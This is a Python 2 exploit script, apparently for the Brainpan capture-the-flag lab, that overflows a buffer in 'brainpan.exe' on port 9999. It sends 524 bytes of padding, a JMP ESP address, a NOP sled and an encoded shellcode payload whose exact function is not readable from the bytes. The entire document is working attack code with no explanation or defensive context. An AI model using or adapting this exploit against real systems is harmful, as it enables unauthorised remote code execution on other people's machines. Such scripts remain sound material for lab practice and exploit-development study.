#!/usr/bin/python
import socket

target_address="192.168.56.101"
target_port=9999



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buf =  ""
buf += "\xbf\xb3\xa5\x27\xc2\xda\xd1\xd9\x74\x24\xf4\x58\x31"
buf += "\xc9\xb1\x12\x83\xe8\xfc\x31\x78\x0e\x03\xcb\xab\xc5"
buf += "\x37\x1a\x6f\xfe\x5b\x0f\xcc\x52\xf6\xad\x5b\xb5\xb6"
buf += "\xd7\x96\xb6\x24\x4e\x99\x88\x87\xf0\x90\x8f\xee\x98"
buf += "\xe2\xd8\x29\x3f\x8b\x1a\x4a\xea\x22\x92\xab\xa4\xd3"
buf += "\xf4\x7a\x97\xa8\xf6\xf5\xf6\x02\x78\x57\x90\xf2\x56"
buf += "\x2b\x08\x63\x86\xe4\xaa\x1a\x51\x19\x78\x8e\xe8\x3f"
buf += "\xcc\x3b\x26\x3f"



junk = 'A' * 524 
jmpesp = '\xf3\x12\x17\x31' # JMP ESP in brainpan.exe
buffer =  junk + jmpesp + ('\x90' * 50) + buf
try:
	sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=sock.connect((target_address,target_port))
	sock.send(buffer)
	sock.close()
	print "Done!"
except:
	print "Could not connect"

